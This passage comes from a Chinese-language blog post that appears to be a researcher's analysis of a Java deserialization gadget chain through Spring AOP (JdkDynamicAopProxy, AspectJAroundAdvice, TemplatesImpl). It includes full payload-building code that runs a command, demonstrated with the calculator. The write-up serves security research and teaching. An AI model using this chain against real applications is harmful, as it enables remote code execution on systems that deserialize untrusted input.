src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>发现这个有个继承。又因为他是一个接口。所以上面这段代码cached &#x3D; this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass);我们运行的就是这个继承下的getInterceptorsAndDynamicInterceptionAdvice。</p><p>代码段如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* loaded from: spring-aop-5.3.19.jar:org/springframework/aop/framework/DefaultAdvisorChainFactory.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultAdvisorChainFactory</span> <span class="keyword">implements</span> <span class="title class_">AdvisorChainFactory</span>, Serializable &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// org.springframework.aop.framework.AdvisorChainFactory</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Object&gt; <span class="title function_">getInterceptorsAndDynamicInterceptionAdvice</span><span class="params">(Advised config, Method method, <span class="meta">@Nullable</span> Class&lt;?&gt; targetClass)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> match;</span><br><span class="line">        <span class="type">AdvisorAdapterRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> GlobalAdvisorAdapterRegistry.getInstance();</span><br><span class="line">        Advisor[] advisors = config.getAdvisors();</span><br><span class="line">        List&lt;Object&gt; interceptorList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(advisors.length);</span><br><span class="line">        Class&lt;?&gt; actualClass = targetClass != <span class="literal">null</span> ? targetClass : method.getDeclaringClass();</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">hasIntroductions</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Advisor advisor : advisors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (advisor <span class="keyword">instanceof</span> PointcutAdvisor) &#123;</span><br><span class="line">                <span class="type">PointcutAdvisor</span> <span class="variable">pointcutAdvisor</span> <span class="operator">=</span> (PointcutAdvisor) advisor;</span><br><span class="line">                <span class="keyword">if</span> (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) &#123;</span><br><span class="line">                    <span class="type">MethodMatcher</span> <span class="variable">mm</span> <span class="operator">=</span> pointcutAdvisor.getPointcut().getMethodMatcher();</span><br><span class="line">                    <span class="keyword">if</span> (mm <span class="keyword">instanceof</span> IntroductionAwareMethodMatcher) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hasIntroductions == <span class="literal">null</span>) &#123;</span><br><span class="line">                            hasIntroductions = Boolean.valueOf(hasMatchingIntroductions(advisors, actualClass));</span><br><span class="line">                        &#125;</span><br><span class="line">                        match = ((IntroductionAwareMethodMatcher) mm).matches(method, actualClass, hasIntroductions.booleanValue());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        match = mm.matches(method, actualClass);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (match) &#123;</span><br><span class="line">                        MethodInterceptor[] interceptors = registry.getInterceptors(advisor);</span><br><span class="line">                        <span class="keyword">if</span> (mm.isRuntime()) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (MethodInterceptor interceptor : interceptors) &#123;</span><br><span class="line">                                interceptorList.add(<span class="keyword">new</span> <span class="title class_">InterceptorAndDynamicMethodMatcher</span>(interceptor, mm));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            interceptorList.addAll(Arrays.asList(interceptors));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (advisor <span class="keyword">instanceof</span> IntroductionAdvisor) &#123;</span><br><span class="line">                <span class="type">IntroductionAdvisor</span> <span class="variable">ia</span> <span class="operator">=</span> (IntroductionAdvisor) advisor;</span><br><span class="line">                <span class="keyword">if</span> (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) &#123;</span><br><span class="line">                    Interceptor[] interceptors2 = registry.getInterceptors(advisor);</span><br><span class="line">                    interceptorList.addAll(Arrays.asList(interceptors2));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Interceptor[] interceptors3 = registry.getInterceptors(advisor);</span><br><span class="line">                interceptorList.addAll(Arrays.asList(interceptors3));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> interceptorList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasMatchingIntroductions</span><span class="params">(Advisor[] advisors, Class&lt;?&gt; actualClass)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Advisor advisor : advisors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (advisor <span class="keyword">instanceof</span> IntroductionAdvisor) &#123;</span><br><span class="line">                <span class="type">IntroductionAdvisor</span> <span class="variable">ia</span> <span class="operator">=</span> (IntroductionAdvisor) advisor;</span><br><span class="line">                <span class="keyword">if</span> (ia.getClassFilter().matches(actualClass)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是 Spring AOP 中用于构建方法拦截器链的核心逻辑，来自 <code>DefaultAdvisorChainFactory</code> 类的 <code>getInterceptorsAndDynamicInterceptionAdvice</code> 方法。其主要作用是根据当前方法（<code>method</code>）和目标类（<code>targetClass</code>），从配置的 Advisor 列表中筛选出匹配的拦截器（<code>MethodInterceptor</code>），并生成最终的拦截器链。</p><p>我们需要重点关注的是这个函数的返回值。因为他会被赋值给cached。</p><p>这个方法最终返回的就是<code>interceptorList</code>对象，我们需要再分析这个对象如何添加元素，然后往上找这个元素是怎么生成的。</p><p><code>interceptorList</code>被创建之后存在两种可以运行的函数一种是interceptorList.add()一种是interceptorList.addAll()</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>我们可以发现无论是addAll函数还是add函数的调用前面都有</p><p>registry.getInterceptors(advisor);</p><p>getInterceptors是一个获得拦截器的函数</p><p>而<code>registry</code>则是直接通过静态<code>GlobalAdvisorAdapterRegistry.getInstance()</code>方法获取的静态单例类</p><p>这里下面一小部分粘贴笔者原话偷个懒(因为写到这的时候有事情忙去了。过段时间回来看已经大脑空白了。)</p><p>但是下面的项目源代码是我自己写的分析(先写的项目源代码分析然后再写污染链分析)</p><p>静态单例类一般无法通过反序列化过程控制的，要想修改这种实例的元素或属性，还需要其他执行分支甚至其他反序列化gadget chain来调用实例的方法。</p><p>认真审了一下<code>org.springframework.aop.framework.adapter.DefaultAdvisorAdapterRegistry#getInterceptors</code>方法。</p><p>一下子就看到了希望，核心逻辑：advice变量是可控的，如果这个变量同时实现<code>Advice</code>和<code>MethodInterceptor</code>接口，则可以将其添加到interceptors，这个interceptors就是我们最终返回的目标chain。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> MethodInterceptor[] getInterceptors(Advisor advisor) <span class="keyword">throws</span> UnknownAdviceTypeException &#123;</span><br><span class="line">    List&lt;MethodInterceptor&gt; interceptors = newArrayList&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// 可控，只要可序列化即可</span></span><br><span class="line">    Adviceadvice= advisor.getAdvice();</span><br><span class="line">    <span class="keyword">if</span> (advice <span class="keyword">instanceof</span> MethodInterceptor) &#123;</span><br><span class="line">        <span class="comment">// 如果advice本身实现了MethodInterceptor接口，将advice直接添加到interceptors！！！</span></span><br><span class="line">        interceptors.add((MethodInterceptor) advice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (AdvisorAdapter adapter : <span class="built_in">this</span>.adapters) &#123;</span><br><span class="line">        <span class="keyword">if</span> (adapter.supportsAdvice(advice)) &#123;</span><br><span class="line">            interceptors.add(adapter.getInterceptor(advisor));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (interceptors.isEmpty()) &#123;</span><br><span class="line">        thrownewUnknownAdviceTypeException(advisor.getAdvice());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> interceptors.toArray(newMethodInterceptor[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>笔者的需求是interceptors中元素是一个<code>AspectJAroundAdvice</code>实例，很显然，这个类满足了实现<code>MethodInterceptor</code>接口的需求，但并没有实现<code>Advice</code>….</p><p>看到这里，熟悉反序列化或者是看过笔者上一篇文章文章的小伙伴，应该会一下子就想到动态代理，而我们恰好又有spring-aop依赖，<code>JdkDynamicAopProxy</code>本来不就是用来做这个东西的吗？</p><p>通过<code>JdkDynamicAopProxy</code>来同时代理<code>Advice</code>和<code>MethodInterceptor</code>接口，并设置反射调用对象是<code>AspectJAroundAdvice</code>，如果后续仅被调用<code>MethodInterceptor</code>接口的方法，就可以直接混水摸鱼，如果还会调用<code>Advice</code>接口的方法，则可以再尝试使用<code>CompositeInvocationHandlerImpl</code>，详情可以参考上一篇文章《高版本Fastjson在Java原生反序列化中的利用》。</p><p>经过测试，这里只需要<code>JdkDynamicAopProxy</code>就可以了。到这里，整条gadget chain的主要障碍都基本被扫清了，剩下的就是一些边边角角的修改。</p><h2 id="项目源代码分析："><a href="#项目源代码分析：" class="headerlink" title="项目源代码分析："></a>项目源代码分析：</h2><p>这里粘贴主要文件的源码。会在后续内容粘贴其他文件的部分源码。想看完整版的可以去看项目</p><p>有些代码块太长复杂的话我一般都在代码块后面直接讲这段实现了什么或者重点是什么。可以先看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.aopalliance.aop.Advice;</span><br><span class="line"><span class="keyword">import</span> org.aopalliance.intercept.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.Advisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJExpressionPointcut;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.SingletonAspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.DefaultAdvisorChainFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.support.DefaultIntroductionAdvisor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringAOP1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">SpringAOP1</span> <span class="variable">aop1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpringAOP1</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> aop1.getObject(Util.getDefaultTestCmd());</span><br><span class="line">        Util.runGadgets(object);</span><br><span class="line"><span class="comment">//        String path = &quot;/tmp/Deserialization/AOP1/aop1.ser&quot;;</span></span><br><span class="line"><span class="comment">//        Util.writeObj2File(object,path);</span></span><br><span class="line"><span class="comment">//        Util.readObj4File(path);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(String cmd)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> getAspectJAroundAdvice(cmd);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy1</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(aspectJAroundAdvice);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy1</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy1, Advisor.class, MethodInterceptor.class);</span><br><span class="line">        <span class="type">Advisor</span> <span class="variable">advisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultIntroductionAdvisor</span>((Advice) proxy1);</span><br><span class="line">        List&lt;Advisor&gt; advisors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        advisors.add(advisor);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisors&quot;</span>,advisors);</span><br><span class="line">        <span class="type">DefaultAdvisorChainFactory</span> <span class="variable">advisorChainFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultAdvisorChainFactory</span>();</span><br><span class="line">        Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisorChainFactory&quot;</span>,advisorChainFactory);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy2</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(<span class="string">&quot;ape1ron&quot;</span>,advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy2</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy2, Map.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">badAttrValExe</span> <span class="operator">=</span> BadAttrValExeNode.makeGadget(proxy2);</span><br><span class="line">        <span class="keyword">return</span> badAttrValExe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> AspectJAroundAdvice <span class="title function_">getAspectJAroundAdvice</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> TemplatesImplNode.makeGadget(cmd);</span><br><span class="line">        <span class="type">SingletonAspectInstanceFactory</span> <span class="variable">singletonAspectInstanceFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingletonAspectInstanceFactory</span>(templatesImpl);</span><br><span class="line">        <span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> Reflections.newInstanceWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;aspectInstanceFactory&quot;</span>,singletonAspectInstanceFactory);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;declaringClass&quot;</span>, TemplatesImpl.class);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;parameterTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//        Method targetMethod = Reflections.getMethod(TemplatesImpl.class,&quot;newTransformer&quot;,new Class[0]);</span></span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(aspectJAroundAdvice,&quot;aspectJAdviceMethod&quot;,targetMethod);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AspectJExpressionPointcut</span> <span class="variable">aspectJExpressionPointcut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJExpressionPointcut</span>();</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;pointcut&quot;</span>,aspectJExpressionPointcut);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;joinPointArgumentIndex&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;joinPointStaticPartArgumentIndex&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> aspectJAroundAdvice;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概过一下顺序</p><p>开始分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">SpringAOP1</span> <span class="variable">aop1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpringAOP1</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> aop1.getObject(Util.getDefaultTestCmd());</span><br><span class="line">        Util.runGadgets(object);</span><br><span class="line"><span class="comment">//        String path = &quot;/tmp/Deserialization/AOP1/aop1.ser&quot;;</span></span><br><span class="line"><span class="comment">//        Util.writeObj2File(object,path);</span></span><br><span class="line"><span class="comment">//        Util.readObj4File(path);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先遇到的是getDefaultTestCmd()函数</p><p>会返回一个calc的string用于弹计算器用的</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">getDefaultTestCmd</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">String</span> osName = <span class="title class_">System</span>.<span class="title function_">getProperty</span>(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (osName.<span class="title function_">startsWith</span>(<span class="string">&quot;Mac&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着是getObject()函数。是主要逻辑</p><p>这段逻辑从末尾开始往前讲笔者感觉会更好理解。所以笔者这里从后往前分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(String cmd)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> getAspectJAroundAdvice(cmd);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy1</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(aspectJAroundAdvice);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">proxy1</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy1, Advisor.class, MethodInterceptor.class);</span><br><span class="line">    <span class="type">Advisor</span> <span class="variable">advisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultIntroductionAdvisor</span>((Advice) proxy1);</span><br><span class="line">    List&lt;Advisor&gt; advisors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    advisors.add(advisor);</span><br><span class="line">    <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">    Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisors&quot;</span>,advisors);</span><br><span class="line">    <span class="type">DefaultAdvisorChainFactory</span> <span class="variable">advisorChainFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultAdvisorChainFactory</span>();</span><br><span class="line">    Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisorChainFactory&quot;</span>,advisorChainFactory);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy2</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(<span class="string">&quot;ape1ron&quot;</span>,advisedSupport);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">proxy2</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy2, Map.class);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">badAttrValExe</span> <span class="operator">=</span> BadAttrValExeNode.makeGadget(proxy2);</span><br><span class="line">    <span class="keyword">return</span> badAttrValExe;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的BadAttrValExeNode.<em>makeGadget</em>(proxy2);是整个反序列化链的入口</p><p>先看一眼代码吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttrValExeNode</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGadget</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span> (<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, obj);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;stackTrace&quot;</span>, <span class="keyword">new</span> <span class="title class_">StackTraceElement</span>[<span class="number">0</span>]);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;cause&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里利用到了BadAttributeValueExpException这个类</p><p>构造函数和readObject函数如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the 